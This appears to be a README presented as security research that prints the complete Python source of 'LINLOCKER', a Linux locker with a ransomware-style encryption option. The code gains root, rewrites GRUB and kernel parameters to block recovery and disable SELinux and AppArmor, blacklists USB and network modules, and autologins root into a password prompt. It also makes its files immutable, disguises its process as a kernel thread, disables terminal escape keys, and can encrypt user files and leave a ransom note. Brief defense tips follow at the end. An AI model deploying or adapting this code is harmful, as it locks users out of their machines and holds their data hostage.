# 🔒 linux-locker-research


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                        ║
║              Linux System Locking Mechanisms                      ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Date:** 03.03.2026  
**Project:** LINUX-LOCKER-RESEARCH  

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Linux system locking and persistence mechanisms |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **🔐 Warning** | This code will **LOCK** the target system until correct password is provided |
| **📚 Educational** | Understanding these techniques is essential for building robust defenses |

</div>

---

## 📖 Table of Contents

| Section | Description |
|---------|-------------|
| [1. Configuration](#1-configuration-section) | Password and encryption settings |
| [2. Imports and Initialization](#2-imports-and-initialization) | Module imports and global variables |
| [3. Utility Functions](#3-utility-functions) | get_distribution(), cmd(), get_root() |
| [4. System Modification Functions](#4-system-modification-functions) | update_grub(), update_initramfs(), disable_net() |
| [5. Encryption Functions](#5-encryption-functions) | enc(), encrypt_file(), encrypt() |
| [6. Initialization (init)](#6-initialization-init) | System lockdown setup |
| [7. Shell Loop (shell)](#7-shell-loop-shell) | Password prompt loop |
| [8. Welcome Screen (welcome)](#8-welcome-screen-welcome) | Password verification |
| [9. Destruction (destroy)](#9-destruction-destroy) | System restoration |
| [10. Process Initialization (init_proc)](#10-process-initialization-init_proc) | Process hardening |
| [11. Main Entry Point](#11-main-entry-point) | main() |
| [12. Defense Recommendations](#12-defense-recommendations) | Protection measures |

---

# English

## 1. Configuration Section

<details>
<summary><b>📁 Click to expand: Password and Encryption Settings</b></summary>

```python
#=====================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 03.03.2026
#     PROJECT  : LINUX-LOCKER-RESEARCH
#     PLATFORM : LINUX
#=====================================#

#
#-
#--
#---
#----
#-----
#------
# HERE IS LINLOCKER HASH SHA-256 OF PASSWORD 
# GENERATE: python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"
PASSWORD = '' 

# RESPONSIBLE FOR ENCRYPTION (ENABLED IF ENCRYPTION == True ELSE DISABLED)
ENCRYPTION = False 

MSG = '''
 ####      ####    ##   ##  ####      #####     ####   ###  ##  #######  ######
  ##        ##     ###  ##   ##      ##   ##   ##  ##   ##  ##   ##   #   ##  ##
  ##        ##     #### ##   ##      ##   ##  ##        ## ##    ## #     ##  ##
  ##        ##     ## ####   ##      ##   ##  ##        ####     ####     #####
  ##   #    ##     ##  ###   ##   #  ##   ##  ##        ## ##    ## #     ## ##
  ##  ##    ##     ##   ##   ##  ##  ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 #######   ####    ##   ##  #######   #####     ####   ###  ##  #######  #### ##


Your system is completely locked
Enter password to unlock it
'''
#------
#-----
#----
#---
#--
#-
#
```

**Configuration Analysis:**

| Variable | Purpose | Generation Command |
|----------|---------|-------------------|
| `PASSWORD` | SHA-256 hash of unlock password | `python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"` |
| `ENCRYPTION` | Enable/disable user file encryption | `True` or `False` |
| `MSG` | ASCII art banner displayed at lock screen | Pre-defined LINLOCKER banner |

**Password Hash Generation:**
```bash
python -c "from hashlib import sha256;print(sha256('MySecretPassword'.encode()).hexdigest())"
# Output: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
```

</details>

---

## 2. Imports and Initialization

<details>
<summary><b>📁 Click to expand: Module Imports and Global Variables</b></summary>

```python
import os
from subprocess import run as sp_run, DEVNULL
from shutil import move as move_file, which
from sys import argv, platform, executable
from multiprocessing import Process
from mmap import mmap, ACCESS_WRITE
from getpass import getpass
from hashlib import sha256
from random import randint
from ctypes import CDLL
from time import sleep
from glob import glob

__file__ = os.path.abspath(argv[0])

if platform != 'linux':
    print(f'DO NOT SUPPORT ({platform})')
    os._exit(1)

def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')
    
invalid_type('PASSWORD', PASSWORD, str)

PID = str(os.getpid())

PATH = '/etc/linlocker'
FILE_LINLOCKER = os.path.join(PATH, 'linlocker')
FILE_FLAG = os.path.join(PATH, '._')

OS_RELEASE = '/etc/os-release'
NET = '/sys/class/net/'
GRUB = '/etc/default/grub'
MODPROBE = '/etc/modprobe.d/linlocker.conf'
LOGIND = '/etc/systemd/logind.conf'
GETTY = '/etc/systemd/system/getty@.service.d'
OVERRIDE_CONF = os.path.join(GETTY, 'override.conf')
USERS = [n for n in glob('/home/*') if os.path.isdir(n)]

ENCRYPTION_MAX_SIZE = 134_217_728  # 128 MB
ENCRYPTION_MARK = b'\x1bB\xcd\x1f$v\xd0\xd3'
ENCRYPTION_NONCE = 8
ENCRYPTION_NONCE_NULL = bytes(ENCRYPTION_NONCE)
ENCRYPTION_KEY = sha256(PASSWORD.encode()).digest()
ENCRYPTION_PATH = USERS.copy()
ENCRYPTION_PATH.extend([n for n in glob('/media/*') if os.path.isdir(n)])
ENCRYPTION_PATH.extend([n for n in glob('/mnt/*') if os.path.isdir(n)])

SUDO = which('pkexec' if (os.environ.get('DISPLAY', False) 
    or os.environ.get('WAYLAND_DISPLAY', False)) else 'sudo')

ID = 'linux'

if SUDO is None:
    SUDO = '/usr/bin/' + ('pkexec' if (os.environ.get('DISPLAY', False) 
        or os.environ.get('WAYLAND_DISPLAY', False)) else 'sudo')
```

**Global Variables Analysis:**

| Variable | Value | Purpose |
|----------|-------|---------|
| `PATH` | `/etc/linlocker` | Installation directory |
| `FILE_LINLOCKER` | `/etc/linlocker/linlocker` | Installed binary location |
| `FILE_FLAG` | `/etc/linlocker/._` | Flag file indicating installation complete |
| `GRUB` | `/etc/default/grub` | GRUB configuration file |
| `MODPROBE` | `/etc/modprobe.d/linlocker.conf` | Kernel module blacklist |
| `LOGIND` | `/etc/systemd/logind.conf` | Systemd login configuration |
| `OVERRIDE_CONF` | `/etc/systemd/system/getty@.service.d/override.conf` | TTY autologin override |
| `ENCRYPTION_MAX_SIZE` | 128 MB | Maximum file size for encryption |
| `ENCRYPTION_MARK` | 8-byte signature | Marks encrypted files |
| `ENCRYPTION_KEY` | SHA-256 of password | Encryption key derived from password |

**SUDO Selection Logic:**
- If `DISPLAY` or `WAYLAND_DISPLAY` is set → use `pkexec` (GUI)
- Otherwise → use `sudo` (terminal)

</details>

---

## 3. Utility Functions

<details>
<summary><b>📁 Click to expand: get_distribution(), cmd(), get_root()</b></summary>

### 3.1 get_distribution() — Detect Linux Distribution

```python
def get_distribution():
    if not os.path.isfile(OS_RELEASE):
        return 'linux'
    
    with open(OS_RELEASE, 'r') as f:
        for n in f:
            n = n.strip().replace('"', '').lower()

            if n.startswith('id='):
                return n[3:]

    return 'linux'
```

**Supported Distributions:**
- Debian-based: `debian`, `ubuntu`, `linuxmint`, `pop`, `kali`
- Arch-based: `arch`, `manjaro`, `endeavouros`
- RHEL-based: `fedora`, `rhel`, `centos`, `rocky`, `almalinux`
- SUSE-based: `opensuse`, `opensuse-leap`, `opensuse-tumbleweed`
- Other: `void`

### 3.2 cmd() — Execute Shell Command

```python
def cmd(c, _new=False):
    try:
        return sp_run(c, input=False, stdout=DEVNULL, stderr=DEVNULL, start_new_session=_new).returncode
    except:
        return -1
```

### 3.3 get_root() — Obtain Root Privileges

```python
def get_root():
    if '--root' in argv:
        return

    Process(target=lambda: cmd(
        [SUDO, executable, __file__, '--root'], 
        _new=True
    )).start()
    os._exit(0)
```

**Elevation Strategy:**
1. Check if already running with `--root` flag
2. Spawn new process with `sudo` or `pkexec`
3. Exit current process

</details>

---

## 4. System Modification Functions

<details>
<summary><b>📁 Click to expand: update_grub(), update_initramfs(), disable_net()</b></summary>

### 4.1 update_grub() — Update GRUB Configuration

```python
def update_grub():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-grub'])
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'void'}:
        if cmd(['update-grub']) == 0:
            return 
        
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    else:
        for n in (
            ['update-grub'],
            ['grub-mkconfig', '-o', '/boot/grub/grub.cfg'],
            ['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'],
        ):
            if cmd(n) == 0:
                return 
```

**Distribution-Specific GRUB Commands:**

| Distribution | Command |
|--------------|---------|
| Debian/Ubuntu | `update-grub` |
| Arch | `grub-mkconfig -o /boot/grub/grub.cfg` |
| Fedora/RHEL | `grub2-mkconfig -o /boot/grub2/grub.cfg` |
| OpenSUSE | `grub2-mkconfig -o /boot/grub2/grub.cfg` |
| Void | `update-grub` or `grub-mkconfig` |

### 4.2 update_initramfs() — Update Initramfs

```python
def update_initramfs():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-initramfs', '-u', '-k', 'all']) 
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['mkinitcpio', '-P'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['dracut', '--force']) 
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['mkinitrd'])
    elif ID in {'void'}:
        cmd(['xbps-reconfigure', '-fa'])
    else:
        for n in (
            ['update-initramfs', '-u', '-k', 'all'],
            ['mkinitcpio', '-P'],
            ['dracut', '--force'],
            ['mkinitrd'],
        ):
            if cmd(n) == 0:
                return 
```

**Distribution-Specific Initramfs Commands:**

| Distribution | Command |
|--------------|---------|
| Debian/Ubuntu | `update-initramfs -u -k all` |
| Arch | `mkinitcpio -P` |
| Fedora/RHEL | `dracut --force` |
| OpenSUSE | `mkinitrd` |
| Void | `xbps-reconfigure -fa` |

### 4.3 disable_net() — Disable Network Interfaces

```python
def disable_net():
    for n in os.listdir(NET):
        cmd(['ip', 'link', 'set', n, 'down'])
        cmd(['ifconfig', n, 'down'])
        cmd(['ip', 'addr', 'flush', n])
```

</details>

---

## 5. Encryption Functions

<details>
<summary><b>📁 Click to expand: enc(), encrypt_file(), encrypt()</b></summary>

### 5.1 enc() — Stream Cipher Encryption (ChaCha20-like)

```python
def enc(handle):
    with mmap(handle, 0, access=ACCESS_WRITE) as mf:
        len_mf = len(mf)
        counter = 0
        pos = ENCRYPTION_NONCE
        nonce = mf[:ENCRYPTION_NONCE]

        if nonce == ENCRYPTION_NONCE_NULL:
            nonce = os.urandom(ENCRYPTION_NONCE)
            mf[:ENCRYPTION_NONCE] = nonce

        while pos < len_mf:
            keystream = sha256((ENCRYPTION_KEY + nonce) + counter.to_bytes(8, 'little')).digest()

            counter += 1

            for n in keystream:
                if pos >= len_mf:
                    break

                mf[pos] ^= n
                pos += 1
```

**Encryption Algorithm Analysis:**

| Component | Description |
|-----------|-------------|
| `ENCRYPTION_NONCE` | 8 bytes |
| `ENCRYPTION_KEY` | SHA-256 of password (32 bytes) |
| `counter` | 64-bit little-endian block counter |
| Keystream | SHA-256(key + nonce + counter) |
| Operation | XOR with keystream |

**Algorithm Properties:**
- **Symmetric**: Same operation encrypts and decrypts
- **Stream cipher**: Generates keystream on-the-fly
- **Nonce-based**: Each file gets unique nonce (or random if not set)
- **ChaCha20-inspired**: Counter mode with SHA-256 as PRF

### 5.2 encrypt_file() — Encrypt Single File

```python
def encrypt_file(path):
    try:
        cmd(['chattr', '-i', path])
        cmd(['chattr', '-a', path])

        with open(path, 'rb+') as f:
            if f.read(len(ENCRYPTION_MARK)) == ENCRYPTION_MARK:
                print(path, 'ok!')
                return
        
            f.seek(0, os.SEEK_SET)
            f.write(ENCRYPTION_MARK)
            enc(f.fileno())
    except:
        print(path, 'no!')
    else:
        print(path, 'ok!')
```

**Encryption Process:**
1. Remove immutable (`-i`) and append-only (`-a`) attributes
2. Check if file is already marked as encrypted
3. Write 8-byte `ENCRYPTION_MARK` signature
4. Encrypt remainder of file using `enc()`

### 5.3 encrypt() — Recursive Directory Encryption

```python
def encrypt(root_path):
    for root, _, files in os.walk(root_path):
        for n in files:
            try:
                fp = os.path.join(root, n)

                if os.path.getsize(fp) > ENCRYPTION_MAX_SIZE:
                    continue

                encrypt_file(fp)
            except:
                continue
```

</details>

---

## 6. Initialization (init)

<details>
<summary><b>📁 Click to expand: init()</b></summary>

```python
def init():
    if not os.path.isdir(PATH):
        os.mkdir(PATH)

    if not os.path.isfile(FILE_LINLOCKER) and os.path.isfile(__file__):
        move_file(__file__, FILE_LINLOCKER)
    
    with open(GRUB, 'w') as f:
        f.write('''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_DISABLE_OS_PROBER=true
GRUB_DISABLE_SUBMENU=y             
GRUB_DISABLE_RECOVERY=true
GRUB_DISABLE_INITRD_SIGNATURES=true
GRUB_RECORDFAIL_TIMEOUT=-1
GRUB_DISTRIBUTOR="linlocker"
GRUB_CMDLINE_LINUX_DEFAULT="nomodeset quiet nosplash vt.global_cursor_default=0 printk.devkmsg=off audit=0 loglevel=0 rd.udev.log_level=0 systemd.show_status=0 systemd.confirm_spawn=0 systemd.unit=multi-user.target systemd.crash_shell=0 systemd.crash_poweroff=1 quiet_systemd selinux=0 apparmor=0 security=null panic=0 rd.debug=0 rd.shell=0 rd.emergency=poweroff rd.break=poweroff"
GRUB_CMDLINE_LINUX=""
GRUB_TERMINAL=console
''')
    
    with open(MODPROBE, 'w') as f:
        f.write(''' install usbcore /bin/false
install uas /bin/false
install usb_storage /bin/false
install cdc_acm /bin/false
install mmc_block /bin/false
install ehci_hcd /bin/false
install xhci_hcd /bin/false
install ohci_hcd /bin/false
install fuse /bin/false       
install nbd /bin/false 
install ath10k_pci /bin/false
install btbcm /bin/false
install orinoco /bin/false
install prism2_usb /bin/false
install ath9k /bin/false
install b43 /bin/false
install e1000e /bin/false
install iwlwifi /bin/false
install r8169 /bin/false
install brcmsmac /bin/false
install rtl8188eu /bin/false
install rtl8192cu /bin/false
install bnep /bin/false
install bluetooth /bin/false
install btusb /bin/false
install rfcomm /bin/false
install cdc_ether /bin/false
install usbnet /bin/false
install tun /bin/false
install tap /bin/false
install veth /bin/false
install macvlan /bin/false
install dummy /bin/false
install bridge /bin/false
install snd_hda_intel /bin/false
install snd_hda_codec_hdmi /bin/false
install snd_soc_sst_broadwell /bin/false
install snd_sof_pci /bin/false
install snd_usb_audio /bin/false
install gspca_main /bin/false
install gspca_v4l /bin/false
install uvcvideo /bin/false
''')
        
    if not os.path.isdir(GETTY):
        os.mkdir(GETTY)
        
    with open(OVERRIDE_CONF, 'w') as f:
        f.write(f'''[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin root %I $TERM      
ExecStart=          
ExecStart="{executable}" "{FILE_LINLOCKER}" --root                  
Restart=always
RestartSec=1
''')
        
    with open(LOGIND, 'w') as f:
        f.write('''[Login]
NAutoVTs=1
ReserveVT=1
SessionsMax=1
KillUserProcesses=no
KillExcludeUsers=root
CtrlAltDelBurstAction=ignore                          
HandlePowerKey=ignore
HandleSuspendKey=ignore
HandleHibernateKey=ignore
HandleLidSwitch=ignore
''')
        
    for n in (
        ['systemctl', 'set-default', 'multi-user.target'],
        ['systemctl', 'restart', 'systemd-logind'],
        ['systemctl', 'enable', 'getty.target'],
        ['systemctl', 'disable', 'NetworkManager']
    ):
        cmd(n)

    update_grub()
    update_initramfs()

    disable_net()

    with open(FILE_FLAG, 'w') as f: ...

    for n in [
        PATH,                   
        FILE_LINLOCKER,       
        GRUB,                  
        MODPROBE,               
        LOGIND, 
        OVERRIDE_CONF       
    ]:
        cmd(['chattr', '+i', n])
        cmd(['chmod', '444' if os.path.isfile(n) else '555', n])

    cmd(['reboot'])
```

**System Lockdown Analysis:**

| Component | Modification | Purpose |
|-----------|--------------|---------|
| **GRUB** | Disable recovery, timeout=0, custom cmdline | Prevent boot interruption |
| **Kernel cmdline** | `quiet`, `loglevel=0`, `panic=0`, `rd.emergency=poweroff` | Suppress output, prevent rescue shell |
| **Modules blacklist** | USB, network, sound, webcam drivers | Disable hardware access |
| **getty override** | Auto-login root, execute linlocker | Boot directly to lock screen |
| **logind.conf** | Disable Ctrl+Alt+Del, power/suspend/hibernate keys | Prevent escape attempts |
| **Network** | All interfaces down, IP flushed | Disable remote access |
| **Immutable flag** | `chattr +i` on all config files | Prevent modification |

**Kernel Command Line Parameters:**

| Parameter | Effect |
|-----------|--------|
| `nomodeset` | Disable kernel mode setting |
| `quiet nosplash` | Suppress boot messages |
| `vt.global_cursor_default=0` | Hide cursor |
| `printk.devkmsg=off` | Disable kernel message logging |
| `audit=0` | Disable audit subsystem |
| `loglevel=0` | Minimum log level |
| `systemd.show_status=0` | Hide systemd status |
| `systemd.unit=multi-user.target` | Boot to text mode |
| `selinux=0 apparmor=0` | Disable MAC |
| `panic=0` | Don't reboot on panic |
| `rd.emergency=poweroff` | Power off on emergency |
| `rd.break=poweroff` | Power off on break |

**Blacklisted Kernel Modules:**

| Category | Modules |
|----------|---------|
| USB | `usbcore`, `uas`, `usb_storage`, `ehci_hcd`, `xhci_hcd`, `ohci_hcd` |
| Network | `e1000e`, `iwlwifi`, `r8169`, `tun`, `tap`, `bridge` |
| Bluetooth | `bluetooth`, `btusb`, `bnep`, `rfcomm` |
| Sound | `snd_hda_intel`, `snd_usb_audio` |
| Webcam | `uvcvideo`, `gspca_main` |
| Storage | `mmc_block`, `fuse`, `nbd` |

</details>

---

## 7. Shell Loop (shell)

<details>
<summary><b>📁 Click to expand: shell()</b></summary>

```python
def shell():
    sp_run('clear', shell=True)

    if ENCRYPTION:
        for n in ENCRYPTION_PATH:
            try: 
                encrypt(n)
            except:
                print(n, 'no!')
                continue

    while True:
        try:
            welcome()
        except: 
            continue
```

**Shell Loop Logic:**
1. Clear screen
2. If `ENCRYPTION=True`, encrypt all user directories
3. Enter infinite loop showing welcome/password prompt

</details>

---

## 8. Welcome Screen (welcome)

<details>
<summary><b>📁 Click to expand: welcome()</b></summary>

```python
def welcome():
    sp_run('clear', shell=True)
    print(MSG)

    try:
        password = getpass('PASSWORD: ').strip().encode()
    except EOFError:
        password = 'null'
    
    if sha256(password).hexdigest() == PASSWORD:
        sp_run('clear', shell=True)
        print('Your system has been restored')
        destroy()
    elif password == 'exit':
        cmd(['poweroff'])
        os._exit(0)

    sleep(3)
```

**Password Verification Flow:**
1. Clear screen and display ASCII art banner
2. Prompt for password (hidden input via `getpass`)
3. Hash input with SHA-256 and compare to stored hash
4. If match → restore system (`destroy()`)
5. If "exit" → power off
6. Otherwise → wait 3 seconds and retry

</details>

---

## 9. Destruction (destroy)

<details>
<summary><b>📁 Click to expand: destroy()</b></summary>

```python
def destroy():
    for n in [
        PATH,                   
        FILE_LINLOCKER,       
        GRUB,                  
        MODPROBE,               
        LOGIND, 
        OVERRIDE_CONF   
    ]:
        cmd(['chattr', '-i', n])  
        cmd(['chmod', '755', n])  

    cmd(['rm', '-rf', PATH])

    with open(GRUB, 'w') as f:
        f.write(f'''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_DISTRIBUTOR="{ID.capitalize()}"
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
GRUB_CMDLINE_LINUX=""
''')
        
    if os.path.isfile(MODPROBE):
        os.remove(MODPROBE)

    with open(LOGIND, 'w') as f:
        f.write('[Login]')
    
    if os.path.isfile(OVERRIDE_CONF):
        os.remove(OVERRIDE_CONF)
    
    update_grub()
    update_initramfs()

    for n in (
        ['systemctl', 'set-default', 'graphical.target'],
        ['systemctl', 'restart', 'systemd-logind'],
        ['systemctl', 'enable', 'NetworkManager']
    ):
        cmd(n)

    if ENCRYPTION:
        for n in USERS:
            try:
                with open(os.path.join(n, 'requirement.txt'), 'w') as f:
                    f.write(MSG)
            except:
                continue

    cmd(['reboot'])
    os._exit(0)
```

**System Restoration Process:**

| Step | Action | Purpose |
|------|--------|---------|
| 1 | `chattr -i` on all files | Remove immutable flag |
| 2 | `chmod 755` | Restore permissions |
| 3 | `rm -rf /etc/linlocker` | Delete installation directory |
| 4 | Restore GRUB config | Re-enable normal boot |
| 5 | Remove module blacklist | Re-enable hardware |
| 6 | Restore logind.conf | Re-enable power keys |
| 7 | Remove getty override | Disable auto-login |
| 8 | Update GRUB & initramfs | Apply changes |
| 9 | Set graphical.target | Restore GUI boot |
| 10 | Enable NetworkManager | Restore networking |
| 11 | Create `requirement.txt` | Leave ransom note (if encryption was enabled) |
| 12 | Reboot | Restart system |

</details>

---

## 10. Process Initialization (init_proc)

<details>
<summary><b>📁 Click to expand: init_proc()</b></summary>

```python
def init_proc():
    cmd(['mount', '-o', 'remount,hidepid=2', '/proc'])

    try:
        libc = CDLL(None)
        libc.nice(-20)
        libc.prctl(4, 0, 0, 0, 0)  # PR_SET_DUMPABLE
        libc.prctl(0x59616d61, 0, 0, 0, 0)  # PR_SET_PTRACER
        libc.prctl(15, f'[kworker/{randint(0, 12)}:{randint(0, 12)}]'.encode()[:15], 0, 0, 0)  # PR_SET_NAME
    except: ...

    for n in (
        ['mount', '--bind', '/dev/null', f'/proc/{PID}/cmdline'],
        ['mount', '--bind', '/dev/null', f'/proc/{PID}/comm'],
        ['chrt', '-f', '80', '-p', PID]
    ):
        cmd(n)

    for (p, v) in [
        (f'/proc/{PID}/oom_score_adj', '-1000'),
        (f'/proc/{PID}/oom_adj', '-17'),
        (f'/proc/{PID}/ptrace_scope', '2')
    ]:
        try:
            with open(p, 'w') as f:
                f.write(v)
        except:
            continue
```

**Process Hardening Measures:**

| Measure | Command/Setting | Purpose |
|---------|-----------------|---------|
| Hide processes | `mount -o hidepid=2 /proc` | Other users can't see processes |
| Nice -20 | `nice(-20)` | Highest priority |
| No core dumps | `prctl(PR_SET_DUMPABLE, 0)` | Prevent memory dumping |
| Block ptrace | `prctl(PR_SET_PTRACER, 0)` | Disable debugging |
| Masquerade name | `prctl(PR_SET_NAME, "[kworker/X:Y]")` | Appear as kernel thread |
| Hide cmdline | `mount --bind /dev/null /proc/PID/cmdline` | Hide command line |
| Hide comm | `mount --bind /dev/null /proc/PID/comm` | Hide process name |
| Real-time priority | `chrt -f 80` | SCHED_FIFO with priority 80 |
| OOM protection | `oom_score_adj=-1000` | Never killed by OOM killer |
| Ptrace scope | `ptrace_scope=2` | Only root can ptrace |

</details>

---

## 11. Main Entry Point

<details>
<summary><b>📁 Click to expand: main()</b></summary>

```python
def main():
    global ID

    invalid_type('ENCRYPTION', ENCRYPTION, bool)
    invalid_type('MSG', MSG, str)

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    get_root()

    init_proc()

    for n in (
        ['stty', 'intr', 'undef'],
        ['stty', 'quit', 'undef'],
        ['stty', 'susp', 'undef'],
        ['stty', 'ixon', 'off'],
        ['stty', 'ixoff', 'off'],
        ['stty', 'echoctl', 'off'],
        ['stty', 'eof', 'undef'],      
        ['stty', 'kill', 'undef'],     
        ['stty', 'werase', 'undef'],  
        ['stty', 'rprnt', 'undef'],    
        ['stty', 'lnext', 'undef'],    
        ['stty', 'discard', 'undef'],  
        ['stty', '-isig']             
    ):
        cmd(n)

    ID = get_distribution()

    (shell if os.path.isfile(FILE_FLAG) else init)()
    os._exit(0)

if __name__ == '__main__': main()
```

**Terminal Hardening (stty):**

| Command | Effect |
|---------|--------|
| `stty intr undef` | Disable Ctrl+C (SIGINT) |
| `stty quit undef` | Disable Ctrl+\ (SIGQUIT) |
| `stty susp undef` | Disable Ctrl+Z (SIGTSTP) |
| `stty eof undef` | Disable Ctrl+D (EOF) |
| `stty kill undef` | Disable Ctrl+U (kill line) |
| `stty werase undef` | Disable Ctrl+W (erase word) |
| `stty rprnt undef` | Disable Ctrl+R (reprint) |
| `stty lnext undef` | Disable Ctrl+V (literal next) |
| `stty discard undef` | Disable Ctrl+O (discard output) |
| `stty -isig` | Disable all signal-generating characters |
| `stty ixon off` | Disable XON/XOFF (Ctrl+S/Ctrl+Q) |
| `stty ixoff off` | Disable XON/XOFF flow control |
| `stty echoctl off` | Disable echoing control characters |

**Execution Flow:**
1. Validate configuration
2. Elevate to root (`get_root()`)
3. Harden process (`init_proc()`)
4. Disable terminal escape sequences (`stty`)
5. Detect distribution
6. If already installed (`FILE_FLAG` exists) → run `shell()`
7. Otherwise → run `init()` to install

</details>

---

## 12. Defense Recommendations

### 12.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot with custom keys |
| **GRUB Password** | Set `superusers` and password in `grub.cfg` |
| **Kernel Lockdown** | `lockdown=confidentiality` kernel parameter |
| **Initrd Verification** | Sign initrd with GPG/IMA |
| **Read-only /boot** | Mount `/boot` as read-only |

### 12.2 Runtime Protection

| Measure | Implementation |
|---------|----------------|
| **SELinux/AppArmor** | Enforce mandatory access control |
| **Audit Logging** | Monitor `chattr`, `mount --bind`, `stty` usage |
| **Immutable System Files** | Set `chattr +i` on `/etc/default/grub`, `/etc/systemd/` |
| **Restrict `ptrace`** | `kernel.yama.ptrace_scope=3` |
| **Monitor `/proc` mounts** | Alert on `hidepid=2` and bind mounts over `/proc` |

### 12.3 Terminal Protection

| Measure | Implementation |
|---------|----------------|
| **Restrict `stty`** | Monitor or restrict `stty` usage for non-root users |
| **Use `setsid`** | Run critical processes in new sessions |
| **Disable TTY switching** | Set `NAutoVTs=0` in `logind.conf` |

### 12.4 Detection & Response

| Measure | Implementation |
|---------|----------------|
| **File Integrity Monitoring** | Monitor `/etc/default/grub`, `/etc/systemd/`, `/etc/modprobe.d/` |
| **Audit Rules** | Log `chattr`, `mount`, `stty`, `prctl` syscalls |
| **EDR/XDR** | Detect process masquerading (`[kworker/*]` with Python parent) |
| **Backup GRUB Config** | Keep backup of `/etc/default/grub` in secure location |

### 12.5 Recovery Preparation

| Measure | Implementation |
|---------|----------------|
| **Live USB** | Keep bootable Linux USB for recovery |
| **GRUB Rescue** | Know how to boot with custom kernel parameters |
| **Backup Initramfs** | Keep known-good initramfs backup |
| **chroot Recovery** | Know how to chroot from live environment |

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **механизмы блокировки Linux систем** через модификацию загрузчика, системных служб и терминала.

| Компонент | Модификация |
|-----------|-------------|
| **GRUB** | Отключение recovery, timeout=0, кастомные параметры ядра |
| **Параметры ядра** | `quiet`, `loglevel=0`, `panic=0`, `rd.emergency=poweroff` |
| **Черный список модулей** | USB, сеть, звук, веб-камера |
| **getty override** | Автологин root, запуск linlocker |
| **logind.conf** | Отключение Ctrl+Alt+Del, клавиш питания |
| **Сеть** | Все интерфейсы отключены |
| **Immutable флаг** | `chattr +i` на всех конфигурационных файлах |

---

## 2. Алгоритм шифрования

| Компонент | Описание |
|-----------|----------|
| `ENCRYPTION_NONCE` | 8 байт |
| `ENCRYPTION_KEY` | SHA-256 пароля (32 байта) |
| `counter` | 64-битный счетчик блоков (little-endian) |
| Keystream | SHA-256(key + nonce + counter) |
| Операция | XOR с keystream |

---

## 3. Усиление процесса

| Мера | Команда/Настройка | Цель |
|------|-------------------|------|
| Скрыть процессы | `mount -o hidepid=2 /proc` | Другие пользователи не видят процессы |
| Nice -20 | `nice(-20)` | Максимальный приоритет |
| Без core dump | `prctl(PR_SET_DUMPABLE, 0)` | Запрет дампа памяти |
| Блокировка ptrace | `prctl(PR_SET_PTRACER, 0)` | Запрет отладки |
| Маскировка имени | `prctl(PR_SET_NAME, "[kworker/X:Y]")` | Выглядит как поток ядра |
| Скрыть cmdline | `mount --bind /dev/null /proc/PID/cmdline` | Скрыть командную строку |
| Защита от OOM | `oom_score_adj=-1000` | Никогда не убивается OOM killer |

---

## 4. Защита терминала (stty)

| Команда | Эффект |
|---------|--------|
| `stty intr undef` | Отключить Ctrl+C |
| `stty quit undef` | Отключить Ctrl+\ |
| `stty susp undef` | Отключить Ctrl+Z |
| `stty eof undef` | Отключить Ctrl+D |
| `stty -isig` | Отключить все сигнальные символы |
| `stty ixon off` | Отключить Ctrl+S/Ctrl+Q |

---

## 5. Рекомендации по защите

### 5.1 Защита цепочки загрузки

| Мера | Реализация |
|------|------------|
| **Secure Boot** | Включить UEFI Secure Boot |
| **Пароль GRUB** | Установить `superusers` и пароль в `grub.cfg` |
| **Kernel Lockdown** | `lockdown=confidentiality` |
| **Read-only /boot** | Монтировать `/boot` как read-only |

### 5.2 Защита во время выполнения

| Мера | Реализация |
|------|------------|
| **SELinux/AppArmor** | Принудительный контроль доступа |
| **Аудиторское логирование** | Мониторинг `chattr`, `mount --bind`, `stty` |
| **Неизменяемые системные файлы** | `chattr +i` на `/etc/default/grub`, `/etc/systemd/` |
| **Ограничение ptrace** | `kernel.yama.ptrace_scope=3` |

